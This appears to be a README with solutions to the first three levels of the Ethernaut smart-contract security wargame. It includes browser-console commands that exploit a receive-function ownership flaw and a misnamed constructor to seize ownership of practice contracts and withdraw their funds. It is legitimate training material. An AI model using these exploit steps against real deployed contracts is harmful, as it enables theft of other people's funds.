Solution to the Ethernaut challenges!

## 00 - Hello Ethernaut

For Reference -> [Challenge](./questions/1.Hello_Ethernaut.sol) | [Solution](./answers/1.Hello_Ethernaut.js)

This one's a warm-up. All you have to do is call `info()`, if still confused then check the solution.

## 01 - Fallback

For Reference -> [Challenge](./questions/2.Fallback.sol) | [Solution](./answers/2.Fallback.js)

Here I used the browser's console to solve this challenge. We are going to take the advantage of `receive` function after which some ether could be sent to the contract and we will become the owner.

1. First, let's contribute a small amount less than 0.001 ether after converting ether to wei using `toWei` function within the console itself.

```javascript
    toWei(".0001") // 100000000000000

    await contract.contribute({value: 100000000000000})
```

2. Now, send some ether into the contract by taking advantage of the `receive` function.

```javascript
    await contract.sendTransaction({value: 1})
```

3. Finally, check for the owner whether it's you or not and upon confirmation withdraw the funds

```javascript
    await contract.owner()
    await contract.withdraw()
```

4. At last submit the instance

## 02 - Fallout

For Reference -> [Challenge](./questions/3.Fallout.sol) | [Solution](./answers/3.Fallout.js)

There's a blunder in the constructor name itself as it doesn't matches with the contract name.

Just call the `Fal1out` function and you will be the owner.

```javascript
    await contract.Fal1out()
```
